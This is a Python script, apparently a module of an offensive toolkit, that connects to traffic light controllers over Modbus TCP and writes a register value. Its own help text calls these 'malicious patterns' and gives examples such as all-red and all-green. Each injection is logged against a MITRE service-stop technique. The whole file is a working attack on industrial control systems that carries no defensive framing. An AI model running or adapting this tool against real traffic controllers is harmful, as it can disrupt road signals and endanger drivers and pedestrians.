#!/usr/bin/env python3
# modules/attacks/traffic_light_injector.py

import argparse
import os
import json
import time
from datetime import datetime
from pymodbus.client.sync import ModbusTcpClient

LOG_FILE = "results/traffic_light_injector_log.json"
MITRE_TTP = "T1489"

def log_action(ip, pattern):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "pattern": pattern,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def inject_traffic_pattern(ip, port, pattern_code):
    try:
        client = ModbusTcpClient(ip, port=port)
        client.connect()
        # Assume pattern_code maps to coil #1
        client.write_register(1, pattern_code)
        client.close()
        log_action(ip, pattern_code)
        print(f"[✓] Injected pattern code {pattern_code} to traffic light at {ip}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject malicious patterns into traffic light controllers")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--pattern", type=int, required=True, help="Pattern code (e.g., 1 = All Red, 2 = All Green)")
    args = parser.parse_args()

    inject_traffic_pattern(args.ip, args.port, args.pattern)
